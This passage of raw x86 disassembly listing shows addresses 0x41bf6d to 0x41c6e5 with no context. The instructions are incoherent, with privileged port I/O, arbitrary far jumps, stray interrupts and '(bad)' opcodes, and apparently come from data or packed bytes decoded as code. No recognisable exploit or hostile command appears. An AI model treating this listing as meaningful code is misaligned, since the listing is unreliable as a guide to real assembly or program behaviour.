  41bf6d:	ror    BYTE PTR [ecx-0x5a],0xfe
  41bf71:	fisttp QWORD PTR [edi-0x40]
  41bf74:	adc    BYTE PTR [edi],0x95
  41bf77:	mov    esp,0x1c62178
  41bf7c:	push   ss
  41bf7d:	sub    edx,DWORD PTR [ecx+0x427a9abb]
  41bf83:	xchg   ebx,eax
  41bf84:	and    DWORD PTR [eax+0x3291dab5],edx
  41bf8a:	sti    
  41bf8b:	push   0x11
  41bf8d:	imul   ecx,DWORD PTR [ebx+0x744feb8c],0xde0322a5
  41bf97:	loopne 0x41bfe3
  41bf99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf9a:	jo     0x41bff4
  41bf9c:	dec    edi
  41bf9d:	sub    edi,edi
  41bf9f:	aad    0x6e
  41bfa1:	shl    BYTE PTR [edi],1
  41bfa3:	sahf   
  41bfa4:	mov    ds:0xbe7a3e91,al
  41bfa9:	loope  0x41bf4f
  41bfab:	into   
  41bfac:	fisttp DWORD PTR [edx+0x2f]
  41bfaf:	and    eax,0x543f7f4b
  41bfb4:	shr    edx,0xcf
  41bfb7:	xor    ebx,DWORD PTR [edx]
  41bfb9:	push   0x57
  41bfbb:	push   ebx
  41bfbc:	sar    DWORD PTR [esi+0x2d51dae3],0xf
  41bfc3:	jbe    0x41bf87
  41bfc5:	xchg   edi,eax
  41bfc6:	mov    eax,ds:0x7786e61f
  41bfcb:	xor    edx,DWORD PTR [edx+0x72]
  41bfce:	inc    eax
  41bfcf:	sbb    eax,0xc987c531
  41bfd4:	mov    ebx,0xbdbad72a
  41bfd9:	lods   al,BYTE PTR ds:[esi]
  41bfda:	cmp    eax,0xceb131b6
  41bfdf:	mov    edi,esi
  41bfe1:	or     DWORD PTR [ecx-0x88356fd],ecx
  41bfe7:	add    DWORD PTR [edi],0x33e20d66
  41bfed:	lds    ebp,FWORD PTR [eax]
  41bfef:	jmp    0xa4f445f7
  41bff4:	dec    ebx
  41bff5:	idiv   DWORD PTR [ebx]
  41bff7:	xchg   edx,eax
  41bff8:	and    DWORD PTR [ecx],0x1a
  41bffb:	push   ss
  41bffc:	pop    es
  41bffd:	push   ds
  41bffe:	jmp    0x4a52:0x57e59cc2
  41c005:	add    BYTE PTR [ebx+0x8],0xd7
  41c009:	sub    ch,BYTE PTR fs:[edi+0x6f36c49f]
  41c010:	pushf  
  41c011:	sbb    BYTE PTR [eax],ch
  41c013:	mov    dl,0x5c
  41c015:	push   esi
  41c016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c017:	jae    0x41bff0
  41c019:	in     eax,0xa5
  41c01b:	or     BYTE PTR [edx+0x51],bl
  41c01e:	push   0x45ca86b5
  41c023:	jae    0x41c013
  41c025:	fild   WORD PTR [edi-0x5f]
  41c028:	xchg   ecx,eax
  41c029:	push   es
  41c02a:	mov    dl,0xaf
  41c02c:	mov    DWORD PTR [ecx],ebx
  41c02e:	mov    WORD PTR [edi+0xa],es
  41c031:	out    0xd5,eax
  41c033:	pushf  
  41c034:	dec    ebx
  41c035:	jbe    0x41bfb7
  41c037:	inc    edi
  41c038:	sbb    al,0xb6
  41c03a:	stc    
  41c03b:	mov    bh,0xa2
  41c03d:	mov    ah,0x42
  41c03f:	adc    dl,BYTE PTR [ecx+0x77]
  41c042:	sbb    esp,ebp
  41c044:	push   0x7e
  41c046:	in     eax,dx
  41c047:	jmp    0x65f2:0xd3307d1f
  41c04e:	add    edi,edi
  41c050:	cmp    al,0xaa
  41c052:	popf   
  41c053:	in     eax,0x3
  41c055:	popa   
  41c056:	sbb    esi,edx
  41c058:	mov    edi,0x37fdb5c
  41c05d:	and    edi,DWORD PTR [ebx+eiz*2-0x148c9a3a]
  41c064:	pop    eax
  41c065:	ins    DWORD PTR es:[edi],dx
  41c066:	cmp    al,BYTE PTR [edi+ebx*4+0x7efe476d]
  41c06d:	push   esp
  41c06e:	and    BYTE PTR [ecx+0xd],0xab
  41c072:	xchg   ecx,eax
  41c073:	sub    BYTE PTR [edx-0x76],dh
  41c076:	mov    ?,WORD PTR [esi+0x556c3693]
  41c07c:	cmp    eax,0x5b1b0c6b
  41c081:	and    eax,0x2f9a11b
  41c086:	ret    
  41c087:	inc    esp
  41c088:	mov    ebx,0x1179ddc4
  41c08d:	inc    ecx
  41c08e:	pop    ebp
  41c08f:	shr    dl,0x84
  41c092:	mov    ebx,ds
  41c094:	sahf   
  41c095:	inc    esi
  41c096:	gs scas eax,DWORD PTR es:[edi]
  41c098:	jp     0x41c0a6
  41c09a:	cdq    
  41c09b:	iret   
  41c09c:	mov    bl,0xb9
  41c09e:	aad    0xd8
  41c0a0:	aaa    
  41c0a1:	enter  0xcb9e,0xf4
  41c0a5:	js     0x41c064
  41c0a7:	xor    DWORD PTR [ecx+0x48691071],esi
  41c0ad:	mov    esp,0x142ad5a1
  41c0b2:	enter  0x33e6,0xc5
  41c0b6:	mov    ebx,0x535c3e87
  41c0bb:	loope  0x41c0d1
  41c0bd:	push   0xffffff98
  41c0bf:	fcmovbe st,st(3)
  41c0c1:	mov    eax,0xc510986c
  41c0c6:	jbe    0x41c0bd
  41c0c8:	cmp    DWORD PTR [edx-0x7ffdb964],esp
  41c0ce:	jnp    0x41c0de
  41c0d0:	jnp    0x41c11e
  41c0d2:	or     eax,0x41423c4e
  41c0d7:	dec    esi
  41c0d8:	inc    ebx
  41c0d9:	mov    eax,ds:0xe3dbf21c
  41c0de:	sbb    ebp,eax
  41c0e0:	dec    edi
  41c0e1:	shl    edx,0x66
  41c0e4:	and    eax,0xb4636040
  41c0e9:	jne    0x41c155
  41c0eb:	jle    0x41c0d6
  41c0ed:	arpl   WORD PTR [esp+ebx*2-0x753a37fe],di
  41c0f4:	push   cs
  41c0f5:	sti    
  41c0f6:	push   ebp
  41c0f7:	xor    BYTE PTR [edx-0x71fbf4dd],0x4
  41c0fe:	and    DWORD PTR [eax+ebp*2-0x64],ebp
  41c102:	dec    ecx
  41c103:	std    
  41c104:	je     0x41c0b9
  41c106:	int    0xd7
  41c108:	int    0xf8
  41c10a:	sti    
  41c10b:	imul   esp,ecx,0x42
  41c10e:	dec    DWORD PTR [ebp+0x17]
  41c111:	imul   ecx,eax,0xffffffb9
  41c114:	xchg   DWORD PTR [ebx-0x6e],ecx
  41c117:	jae    0x41c10c
  41c119:	in     eax,0x80
  41c11b:	jae    0x41c134
  41c11d:	or     ebx,DWORD PTR [eax+ecx*1-0x26]
  41c121:	jl     0x41c195
  41c123:	and    al,0x12
  41c125:	mul    DWORD PTR [edx]
  41c127:	loopne 0x41c13f
  41c129:	cmc    
  41c12a:	ror    BYTE PTR [eax-0x2b22da73],cl
  41c130:	in     al,dx
  41c131:	xchg   BYTE PTR [ebx+edx*2],dl
  41c134:	mov    ch,0xc4
  41c136:	adc    BYTE PTR [eax],bh
  41c138:	mov    ds:0x71b4c08,eax
  41c13d:	adc    edi,DWORD PTR [eax+0x6f]
  41c140:	or     al,0xaa
  41c142:	xchg   esi,eax
  41c143:	inc    edx
  41c144:	mov    ch,0xdf
  41c146:	sbb    eax,0xa4ed4fa7
  41c14b:	pop    ss
  41c14c:	scas   al,BYTE PTR es:[edi]
  41c14d:	xchg   ecx,eax
  41c14e:	fnstcw WORD PTR [esi]
  41c150:	loop   0x41c139
  41c152:	cli    
  41c153:	clc    
  41c154:	lea    ecx,[edx]
  41c156:	push   0x35730d55
  41c15b:	cmp    dh,BYTE PTR [edx]
  41c15d:	push   esi
  41c15e:	adc    BYTE PTR [esi+edi*1-0x4],ah
  41c162:	ret    0xe4dd
  41c165:	mov    dh,0x62
  41c167:	mov    WORD PTR [ecx-0x12b9ffb2],es
  41c16d:	int    0x29
  41c16f:	out    0xb4,al
  41c171:	lods   eax,DWORD PTR ds:[esi]
  41c172:	cli    
  41c173:	mov    WORD PTR [ecx+0x71af684b],?
  41c179:	jo     0x41c17a
  41c17b:	cs mov edi,0x61d5ad5a
  41c181:	push   esp
  41c182:	mov    edi,0x920ba668
  41c187:	sbb    eax,0x24eb8d52
  41c18c:	mov    ecx,0xc42616a2
  41c191:	or     BYTE PTR [ebx],dh
  41c193:	pop    esp
  41c194:	xchg   esp,ebx
  41c196:	and    dh,BYTE PTR [ecx+0x66]
  41c199:	add    esi,esi
  41c19b:	xchg   DWORD PTR es:[ecx],ebp
  41c19e:	and    cl,BYTE PTR [ebp+0x33a25391]
  41c1a4:	loope  0x41c12a
  41c1a6:	int3   
  41c1a7:	std    
  41c1a8:	ins    BYTE PTR es:[edi],dx
  41c1a9:	or     eax,0x454f3f43
  41c1ae:	adc    BYTE PTR [esi],dl
  41c1b0:	xchg   edi,eax
  41c1b1:	out    0x7,eax
  41c1b3:	add    DWORD PTR [ebx-0xb2c33db],0x40
  41c1ba:	nop
  41c1bb:	mov    ah,BYTE PTR [ebp-0x7a2c66d1]
  41c1c1:	mov    ds,WORD PTR [esp+edx*4]
  41c1c4:	or     BYTE PTR [edx+eax*1+0x42],ch
  41c1c8:	and    dl,BYTE PTR ss:[ebp+0x71419cfc]
  41c1cf:	cli    
  41c1d0:	popf   
  41c1d1:	repz loope 0x41c1b8
  41c1d4:	push   es
  41c1d5:	xchg   ebx,eax
  41c1d6:	(bad)  [esi+0x6bcb8f80]
  41c1dc:	fisub  WORD PTR [ecx+0x48]
  41c1df:	jno    0x41c178
  41c1e1:	lods   eax,DWORD PTR ds:[esi]
  41c1e2:	adc    eax,0x70319b9d
  41c1e7:	sahf   
  41c1e8:	ror    BYTE PTR [edx-0x5f6639c9],0x16
  41c1ef:	mov    ebp,0x32602220
  41c1f4:	inc    edx
  41c1f5:	and    ebx,DWORD PTR [edi-0x4285a968]
  41c1fb:	aam    0x6a
  41c1fd:	sbb    al,0xd8
  41c200:	mov    ds:0x9ec934c6,eax
  41c205:	mov    ah,0x1a
  41c207:	inc    ebx
  41c208:	pop    edx
  41c209:	repnz cmc 
  41c20b:	icebp  
  41c20c:	dec    ecx
  41c20d:	test   BYTE PTR [edx-0x2d],al
  41c210:	dec    edi
  41c211:	mov    esi,0xf0481d
  41c216:	mov    ecx,0x7bc3f41d
  41c21b:	jg     0x41c1ce
  41c21d:	pop    es
  41c21e:	sar    DWORD PTR [ebx+0x6d],0xcf
  41c222:	xor    DWORD PTR [eax+0x70d1a983],ebx
  41c228:	xor    BYTE PTR ds:0x3103bb17,bl
  41c22e:	into   
  41c22f:	mov    ebp,0x9fcd0a00
  41c234:	inc    esi
  41c235:	sbb    eax,0xe65d7ed5
  41c23a:	or     ah,BYTE PTR [ebx]
  41c23c:	dec    ecx
  41c23d:	or     esp,edi
  41c23f:	adc    BYTE PTR [edi+0x2ecbb082],bh
  41c245:	mov    esp,0x7ea0ff17
  41c24a:	icebp  
  41c24b:	mov    WORD PTR [esi-0x4d0375be],es
  41c251:	add    al,BYTE PTR [ebx]
  41c253:	lods   al,BYTE PTR ds:[esi]
  41c254:	jecxz  0x41c230
  41c256:	jnp    0x41c2a7
  41c258:	fsubrp st(2),st
  41c25a:	retf   
  41c25b:	cs imul esi,edx,0xa48aac4b
  41c262:	loopne 0x41c231
  41c264:	daa    
  41c265:	ror    ah,cl
  41c267:	mov    esi,DWORD PTR [esi+0x43]
  41c26a:	(bad)  
  41c26b:	fnstsw WORD PTR [eax+0x4d]
  41c26e:	icebp  
  41c26f:	or     BYTE PTR [edx-0x4a],al
  41c272:	aas    
  41c273:	or     BYTE PTR [eax],dh
  41c275:	loope  0x41c272
  41c277:	adc    cl,BYTE PTR [edx-0x4c]
  41c27a:	dec    ebp
  41c27b:	out    0x40,al
  41c27d:	xchg   ebp,eax
  41c27e:	psrad  mm4,mm6
  41c281:	nop
  41c282:	outs   dx,DWORD PTR ds:[esi]
  41c283:	in     al,0xce
  41c285:	fisttp DWORD PTR [ebx-0x29]
  41c288:	xchg   DWORD PTR [ebp-0x154b71cf],esi
  41c28e:	outs   dx,DWORD PTR ds:[esi]
  41c28f:	lea    esi,[esi+0x58]
  41c292:	sahf   
  41c293:	sub    eax,ebx
  41c295:	into   
  41c296:	dec    ebp
  41c297:	sbb    BYTE PTR [ebx+eiz*1],0xfb
  41c29b:	push   edx
  41c29c:	imul   esp,DWORD PTR [edx-0x1c],0x6e
  41c2a0:	leave  
  41c2a1:	dec    esp
  41c2a2:	or     eax,0xdc0a1599
  41c2a7:	jns    0x41c251
  41c2a9:	leave  
  41c2aa:	(bad)  
  41c2ab:	js     0x41c230
  41c2ad:	loop   0x41c31f
  41c2af:	ret    
  41c2b0:	dec    edi
  41c2b1:	jno    0x41c24d
  41c2b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b4:	push   edx
  41c2b5:	mul    DWORD PTR [ecx]
  41c2b7:	add    eax,0x7696895
  41c2bc:	mov    bh,0xe
  41c2be:	out    dx,al
  41c2bf:	outs   dx,DWORD PTR ds:[esi]
  41c2c0:	push   edx
  41c2c1:	in     eax,0x3b
  41c2c3:	outs   dx,DWORD PTR ds:[esi]
  41c2c4:	fbstp  TBYTE PTR [eax+edx*4]
  41c2c7:	xlat   BYTE PTR ds:[ebx]
  41c2c8:	fst    DWORD PTR [eax-0x6b]
  41c2cb:	inc    esp
  41c2cc:	leave  
  41c2cd:	or     BYTE PTR [edx+ebp*8],al
  41c2d0:	jne    0x41c34a
  41c2d2:	xchg   edi,eax
  41c2d3:	cli    
  41c2d4:	dec    esp
  41c2d5:	mov    eax,0x6d185393
  41c2da:	add    esi,ecx
  41c2dc:	mov    DWORD PTR [edx-0x50343ea9],esp
  41c2e2:	mov    ch,0xef
  41c2e4:	xor    cl,BYTE PTR [edx+ebx*2]
  41c2e7:	das    
  41c2e8:	ss xchg esp,eax
  41c2ea:	pop    ss
  41c2eb:	add    al,0xd5
  41c2ed:	je     0x41c33b
  41c2ef:	pop    ss
  41c2f0:	ss into 
  41c2f2:	adc    BYTE PTR [ebp+0x5e],cl
  41c2f5:	inc    esp
  41c2f6:	inc    esi
  41c2f7:	in     eax,dx
  41c2f8:	mov    cl,0x9a
  41c2fa:	sub    esp,DWORD PTR [eax+0x21]
  41c2fd:	out    0xc,eax
  41c2ff:	das    
  41c300:	xor    al,0xee
  41c302:	cld    
  41c303:	add    esi,edx
  41c305:	cmp    eax,0x110a188c
  41c30a:	inc    ecx
  41c30b:	mov    ds:0x31e3236f,al
  41c310:	jg     0x41c316
  41c312:	or     cl,BYTE PTR [esi-0x39]
  41c315:	jmp    0x468634ec
  41c31a:	data16 xor al,0x7
  41c31d:	pop    ebx
  41c31e:	xor    esi,edx
  41c320:	or     al,0x2c
  41c322:	test   DWORD PTR ds:0x82f95877,eax
  41c328:	sub    BYTE PTR [ecx-0x2091f86f],ch
  41c32e:	call   0xd5c3:0xad1610e4
  41c335:	retf   
  41c336:	pop    ss
  41c337:	xor    al,0xd5
  41c339:	ror    DWORD PTR [edx+0x9],0xd2
  41c33d:	sbb    eax,0x35590ea6
  41c342:	(bad)  
  41c343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c344:	test   DWORD PTR [esi],edi
  41c346:	frstor [ebx-0x1423fa1b]
  41c34c:	dec    esi
  41c34d:	or     ecx,DWORD PTR [eax]
  41c34f:	test   edi,0xc47f8e56
  41c355:	stos   DWORD PTR es:[edi],eax
  41c356:	mov    eax,0xd3666485
  41c35b:	fadd   QWORD PTR [esi]
  41c35d:	adc    eax,0xb7092607
  41c362:	mov    eax,ds:0xd6559dc6
  41c367:	mov    esi,0x70db6e6a
  41c36c:	inc    eax
  41c36d:	add    DWORD PTR [ecx-0xa],eax
  41c370:	sub    eax,0xf5ba63a2
  41c375:	cmp    al,0xd4
  41c377:	xchg   BYTE PTR [edx],bl
  41c379:	pop    esi
  41c37a:	popf   
  41c37b:	jae    0x41c334
  41c37d:	jbe    0x41c37a
  41c37f:	push   esi
  41c380:	cs hlt 
  41c382:	mov    al,ds:0xf1244bab
  41c387:	ds xor al,0x74
  41c38a:	outs   dx,BYTE PTR ds:[esi]
  41c38b:	fdiv   QWORD PTR [esi]
  41c38d:	mov    dh,0x4f
  41c38f:	imul   ecx,esp,0xdd1d7a40
  41c395:	push   ecx
  41c396:	jmp    0x1d370271
  41c39b:	mov    edi,DWORD PTR [esi+0x6374ead4]
  41c3a1:	sar    DWORD PTR ds:0x329b7cd4,cl
  41c3a7:	jg     0x41c3c5
  41c3a9:	test   DWORD PTR [ebx+0x7f],edi
  41c3ac:	or     eax,0x9b249987
  41c3b1:	pop    esi
  41c3b2:	out    0x6,al
  41c3b4:	lds    eax,FWORD PTR [eax+0x30c1410e]
  41c3ba:	pop    ss
  41c3bb:	in     al,dx
  41c3bc:	xor    DWORD PTR [ecx+ebp*8+0x3aaff90e],0xbb7ff4ba
  41c3c7:	pop    esp
  41c3c8:	test   DWORD PTR [edi],edx
  41c3ca:	jo     0x41c34c
  41c3cc:	fdivr  st(6),st
  41c3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3cf:	(bad)  
  41c3d0:	ficomp DWORD PTR [edx]
  41c3d2:	adc    eax,eax
  41c3d4:	int3   
  41c3d5:	mov    bh,0x58
  41c3d7:	xchg   edi,eax
  41c3d8:	push   esp
  41c3d9:	push   ecx
  41c3da:	sbb    bl,BYTE PTR [esi-0x18222b99]
  41c3e0:	mov    eax,ds:0xca7bbf14
  41c3e5:	add    ecx,DWORD PTR ss:[edi+eiz*8-0x73]
  41c3ea:	xchg   ebx,eax
  41c3eb:	push   edi
  41c3ec:	std    
  41c3ed:	inc    esi
  41c3ee:	pop    ecx
  41c3ef:	mov    edi,0xbbc1ed50
  41c3f4:	mov    ds:0x10879a9,eax
  41c3f9:	push   cs
  41c3fa:	push   es
  41c3fb:	rcl    DWORD PTR [ebp+ebp*8-0x4e82f120],1
  41c402:	pop    edx
  41c403:	and    al,0x7f
  41c405:	xlat   BYTE PTR ds:[ebx]
  41c406:	addr16 dec edx
  41c408:	(bad)  
  41c409:	outs   dx,BYTE PTR ds:[esi]
  41c40a:	cmp    edx,DWORD PTR [ebp+0x6c1c84d8]
  41c410:	jmp    0xf30d:0xd2b4cc2e
  41c417:	dec    ebp
  41c418:	pushf  
  41c419:	xor    cl,BYTE PTR [esi+0x3b]
  41c41c:	sbb    al,al
  41c41e:	or     BYTE PTR [ebp+0x3b915be0],0xda
  41c425:	mov    ah,0x40
  41c427:	sbb    dh,ch
  41c429:	stc    
  41c42a:	not    DWORD PTR [ebx]
  41c42c:	mov    DWORD PTR [edi+0x29],esp
  41c42f:	call   0x36f0b2a4
  41c434:	shl    BYTE PTR [ecx],cl
  41c436:	rcl    DWORD PTR [esi+0x4d],1
  41c439:	arpl   WORD PTR [ecx],bx
  41c43b:	mov    edx,0xa0de3f5a
  41c440:	xor    BYTE PTR [edx-0x25],cl
  41c443:	cmc    
  41c444:	add    BYTE PTR [ecx],0x1f
  41c447:	neg    BYTE PTR [eax+0x1886c8af]
  41c44d:	xor    BYTE PTR [ebp-0x2d5fbbdf],dl
  41c453:	mov    ds:0x75b6ddc,eax
  41c458:	push   0x1c
  41c45a:	xor    eax,0x91bf88f2
  41c45f:	nop
  41c460:	popf   
  41c461:	push   cs
  41c462:	xchg   DWORD PTR ds:0xec36ff2f,ebx
  41c468:	and    bh,0xe3
  41c46b:	mov    DWORD PTR [ebp+0x28],ebx
  41c46e:	nop
  41c46f:	js     0x41c3ff
  41c471:	jns    0x41c44b
  41c473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c474:	cdq    
  41c475:	sysenter 
  41c477:	rcr    DWORD PTR [esi+0x47],0xf5
  41c47b:	fld    TBYTE PTR [ecx-0x619e7c83]
  41c481:	ins    DWORD PTR es:[edi],dx
  41c482:	xchg   edx,eax
  41c483:	clc    
  41c484:	ins    DWORD PTR es:[edi],dx
  41c485:	aaa    
  41c486:	mov    eax,0x4d650f9d
  41c48b:	and    ch,al
  41c48d:	push   edx
  41c48e:	mov    ebp,0xd8d13240
  41c493:	outs   dx,BYTE PTR ds:[esi]
  41c494:	mov    ds:0x21761bcc,al
  41c499:	pusha  
  41c49a:	and    bl,ch
  41c49c:	mov    eax,ds:0x9f3fe143
  41c4a1:	jb     0x41c4cb
  41c4a3:	add    DWORD PTR [eax],ebp
  41c4a5:	retf   0x98b0
  41c4a8:	pop    esp
  41c4a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4aa:	jmp    0x5e85:0x6521c322
  41c4b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4b2:	addr16 in eax,0xe9
  41c4b5:	pop    ecx
  41c4b6:	sub    ch,BYTE PTR [eax-0x6b9db9dd]
  41c4bc:	pop    ecx
  41c4bd:	iret   
  41c4be:	stc    
  41c4bf:	rol    DWORD PTR [edx+0x1d],0x58
  41c4c3:	mov    dh,0x9e
  41c4c5:	idiv   BYTE PTR [esi+0x6e223245]
  41c4cb:	in     eax,dx
  41c4cc:	fistp  WORD PTR [ecx+0x49d50f6a]
  41c4d2:	fmul   QWORD PTR [ebp-0x65]
  41c4d5:	sti    
  41c4d6:	xchg   edi,eax
  41c4d7:	jns    0x41c558
  41c4d9:	js     0x41c48e
  41c4db:	jg     0x41c46e
  41c4dd:	jmp    0x6b6e:0xae38ad0
  41c4e4:	and    ebp,DWORD PTR [edi+ebx*1+0x7b]
  41c4e8:	into   
  41c4e9:	xchg   ebp,eax
  41c4ea:	push   esi
  41c4eb:	push   ebp
  41c4ec:	push   cs
  41c4ed:	mov    edx,0x2469b648
  41c4f2:	adc    al,0x53
  41c4f4:	cdq    
  41c4f5:	loop   0x41c4cc
  41c4f7:	xchg   ecx,eax
  41c4f8:	push   ecx
  41c4f9:	and    dl,BYTE PTR [edi]
  41c4fb:	imul   esi,DWORD PTR [edi],0x22
  41c4fe:	xchg   ch,ah
  41c500:	sbb    DWORD PTR [edi],ecx
  41c502:	mov    edx,0x3b2660f5
  41c507:	fmulp  st(2),st
  41c509:	pop    ss
  41c50a:	adc    ah,dl
  41c50c:	fld    QWORD PTR [ecx+0x401baa8e]
  41c512:	rcl    BYTE PTR [ebx+0x745432f6],cl
  41c518:	hlt    
  41c519:	sub    al,0x8b
  41c51b:	test   DWORD PTR [esi-0x15],esi
  41c51e:	loope  0x41c4ac
  41c520:	xchg   ebx,eax
  41c521:	std    
  41c522:	inc    eax
  41c523:	scas   eax,DWORD PTR es:[edi]
  41c524:	mov    ch,0x13
  41c526:	ins    DWORD PTR es:[edi],dx
  41c527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c528:	scas   al,BYTE PTR es:[edi]
  41c529:	cdq    
  41c52a:	sbb    BYTE PTR [edx+esi*4],bh
  41c52d:	call   0x284a:0xdd8734b
  41c534:	push   0xd4351a34
  41c539:	fst    DWORD PTR [edi+0x4eb21689]
  41c53f:	inc    edi
  41c540:	lock imul BYTE PTR [eax+esi*4+0x13]
  41c545:	idiv   BYTE PTR [ebx+eiz*4+0xc]
  41c549:	xchg   esp,eax
  41c54a:	iret   
  41c54b:	ins    DWORD PTR es:[edi],dx
  41c54c:	in     al,dx
  41c54d:	xchg   ecx,eax
  41c54e:	push   0x478e8ef1
  41c553:	xchg   ebx,eax
  41c554:	push   ebp
  41c555:	outs   dx,DWORD PTR ds:[esi]
  41c556:	psubsw mm4,mm5
  41c559:	push   ss
  41c55a:	or     al,0xff
  41c55c:	xchg   DWORD PTR [edx+0x49753d48],ecx
  41c562:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41c564:	stos   BYTE PTR es:[edi],al
  41c565:	enter  0x9d03,0x5e
  41c569:	dec    ebp
  41c56a:	mov    ebp,eax
  41c56c:	inc    edi
  41c56d:	jge    0x41c568
  41c56f:	(bad)  
  41c570:	les    ebx,FWORD PTR [edi]
  41c572:	pop    esi
  41c573:	mov    esi,0x745f4b1a
  41c578:	pop    ebp
  41c579:	popf   
  41c57a:	std    
  41c57b:	std    
  41c57c:	or     eax,0x6ae86057
  41c581:	mov    cl,0x7
  41c583:	or     al,0xa6
  41c585:	add    BYTE PTR [esi-0x37],bl
  41c588:	pusha  
  41c589:	retf   
  41c58a:	mov    bl,0x6a
  41c58c:	add    al,BYTE PTR [edx]
  41c58e:	mov    esp,0x252c7f80
  41c593:	ins    BYTE PTR es:[edi],dx
  41c594:	out    0x28,al
  41c596:	in     al,0x67
  41c598:	inc    ecx
  41c599:	inc    edx
  41c59a:	retf   
  41c59b:	xchg   esi,eax
  41c59c:	enter  0x66ed,0xc3
  41c5a0:	iret   
  41c5a1:	dec    edx
  41c5a2:	adc    eax,0xab4b1243
  41c5a7:	js     0x41c556
  41c5a9:	push   es
  41c5aa:	add    DWORD PTR [eax],0x5260f5e9
  41c5b0:	push   ss
  41c5b1:	cmc    
  41c5b2:	pop    esi
  41c5b3:	(bad)  
  41c5b4:	pop    ds
  41c5b5:	or     ecx,DWORD PTR [edi+0x40]
  41c5b8:	(bad)  
  41c5b9:	in     al,dx
  41c5ba:	or     DWORD PTR [eax+0x46895c86],ebp
  41c5c0:	add    ecx,esi
  41c5c2:	adc    al,0x6
  41c5c4:	and    eax,0x19b3d08f
  41c5c9:	test   eax,0xcc4f21f9
  41c5ce:	push   ebp
  41c5cf:	xor    BYTE PTR [edx+0x4d],al
  41c5d2:	mov    eax,ds:0x174a6068
  41c5d7:	(bad)  
  41c5d8:	call   0x6b95:0xa4173131
  41c5df:	sti    
  41c5e0:	shl    BYTE PTR [esi],cl
  41c5e2:	jg     0x41c650
  41c5e4:	dec    ebp
  41c5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5e6:	pop    esp
  41c5e7:	sbb    ebx,edi
  41c5e9:	lea    ebp,[esp+eiz*2+0x4677c76]
  41c5f0:	cwde   
  41c5f1:	sbb    bl,BYTE PTR [edi+edx*8+0x4a]
  41c5f5:	arpl   bx,cx
  41c5f7:	or     ecx,ebx
  41c5f9:	inc    ecx
  41c5fa:	sbb    dh,bl
  41c5fc:	add    bl,dh
  41c5fe:	retf   
  41c5ff:	ds push 0x9ba251f9
  41c605:	push   0x60f33a4
  41c60a:	xlat   BYTE PTR ds:[ebx]
  41c60b:	aam    0x72
  41c60d:	add    bl,BYTE PTR [ecx-0x6cbb859f]
  41c613:	loopne 0x41c5d5
  41c615:	sub    eax,0xabe613ba
  41c61a:	(bad)  
  41c61b:	sub    BYTE PTR [eax+0x3],al
  41c61e:	ret    
  41c61f:	enter  0xce45,0x6a
  41c623:	ss pop ds
  41c625:	test   BYTE PTR [ecx+0x2f],ah
  41c628:	dec    edx
  41c629:	gs aaa 
  41c62b:	mov    dh,0x25
  41c62d:	fsub   st,st(6)
  41c62f:	(bad)  
  41c630:	dec    esi
  41c631:	inc    edi
  41c632:	and    dl,BYTE PTR [esi-0x4a8b1c13]
  41c638:	adc    esp,ecx
  41c63a:	push   ebp
  41c63b:	sub    edi,0x7a4c5aef
  41c641:	pop    eax
  41c642:	cmp    al,0x53
  41c644:	stc    
  41c645:	add    DWORD PTR ds:0x234b2472,edi
  41c64b:	repz jbe 0x41c6a8
  41c64e:	stos   BYTE PTR es:[edi],al
  41c64f:	inc    dx
  41c651:	ret    0xdef2
  41c654:	in     al,dx
  41c655:	jo     0x41c6d5
  41c657:	and    DWORD PTR [edi],ebp
  41c659:	repz jecxz 0x41c611
  41c65c:	mov    BYTE PTR [ecx-0x8582657],bh
  41c662:	xchg   esi,eax
  41c663:	jnp    0x41c69f
  41c665:	xchg   DWORD PTR [ebx],ebp
  41c667:	mov    al,ds:0x7c70446c
  41c66c:	out    0xa6,al
  41c66e:	sar    DWORD PTR [edx-0x6d6b9069],cl
  41c674:	ins    BYTE PTR es:[edi],dx
  41c675:	or     DWORD PTR [bx+si-0x5],ecx
  41c679:	sub    cl,BYTE PTR [esi]
  41c67b:	loopne 0x41c6f9
  41c67d:	fcomp  DWORD PTR [edi-0x28]
  41c680:	inc    edx
  41c681:	retf   0x9409
  41c684:	push   esp
  41c685:	xchg   edx,eax
  41c686:	adc    cl,bl
  41c688:	pop    eax
  41c689:	mov    al,ch
  41c68b:	stos   BYTE PTR es:[edi],al
  41c68c:	push   ecx
  41c68d:	jmp    0xbb8324de
  41c692:	push   ecx
  41c693:	mov    eax,ds:0x7ecfd932
  41c698:	(bad)  
  41c699:	test   eax,0x394cc5a4
  41c69e:	popa   
  41c69f:	mov    ebx,ebx
  41c6a1:	les    edx,FWORD PTR [edx-0x4e]
  41c6a4:	(bad)  
  41c6a5:	xchg   esi,eax
  41c6a6:	push   esp
  41c6a7:	dec    esp
  41c6a8:	arpl   dx,ax
  41c6aa:	adc    al,0x51
  41c6ac:	(bad)  
  41c6ae:	push   ds
  41c6af:	push   ecx
  41c6b0:	ret    
  41c6b1:	int    0xb3
  41c6b3:	popa   
  41c6b4:	dec    ecx
  41c6b5:	shl    BYTE PTR [ebx+0x1aa89250],cl
  41c6bb:	je     0x41c6ed
  41c6bd:	fndisi(8087 only) 
  41c6bf:	retf   
  41c6c0:	xor    DWORD PTR [ecx+0x1c],ebx
  41c6c3:	dec    eax
  41c6c4:	push   0x5a
  41c6c6:	enter  0x787f,0x34
  41c6ca:	add    dh,ah
  41c6cc:	push   ecx
  41c6cd:	or     eax,0xc8797096
  41c6d2:	js     0x41c65c
  41c6d4:	inc    esp
  41c6d5:	mov    dl,0x99
  41c6d7:	jb     0x41c745
  41c6d9:	popa   
  41c6da:	cld    
  41c6db:	or     esp,ebx
  41c6dd:	inc    ecx
  41c6de:	nop
  41c6df:	lds    esp,FWORD PTR [esi]
  41c6e1:	jae    0x41c6a3
  41c6e3:	pop    ss
  41c6e4:	xlat   BYTE PTR ds:[ebx]
  41c6e5:	sbb    eax,0x225dcbf6
